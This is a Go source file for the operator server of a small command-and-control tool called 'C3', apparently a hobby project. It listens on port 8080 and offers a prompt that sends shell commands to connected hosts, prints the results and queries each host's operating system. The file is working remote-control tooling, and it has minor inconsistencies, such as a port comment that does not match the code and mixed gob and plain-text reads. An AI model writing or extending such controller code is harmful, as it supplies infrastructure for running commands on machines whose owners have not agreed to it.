package main

import (
	// Standard
	"bufio"
	"fmt"
	"encoding/gob"
	"net"
	"os"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/color"
)


func shell(conn net.Conn) {
	for {
		fmt.Printf(color.Green + "[shell]: " + color.Reset)
		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		if strings.Compare(cmd, "close\n") == 0 {
			fmt.Fprintf(conn, cmd)
			break
		}

		enc := gob.NewEncoder(conn)
		enc.Encode(cmd)
		// fmt.Fprintf(conn, cmd)

		result, _ := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(string(result))
	}
	conn.Close()
}


func sysinfo(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	enc.Encode("sysinfo")

	result := ""
	dec.Decode(&result)

	switch {
	case result == "windows":
		fmt.Println("The system is running Windows")
	case result == "darwin":
		fmt.Println("The system is running MacOS")
	case result == "linux":
		fmt.Println("The system is running Linux")	
	}
}


func handleConnection(conn net.Conn) {
	for {
		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		reader = strings.TrimSuffix(reader, "\n")

		switch {
		case reader == "shell":
			shell(conn)
		case reader == "sysinfo":
			sysinfo(conn)
		default:
			fmt.Println("Invalid command")
		}
	}
}

func main() {
	fmt.Println("Start server...")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println("Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			// handle error
			continue
		}
		go handleConnection(conn)
	}
}
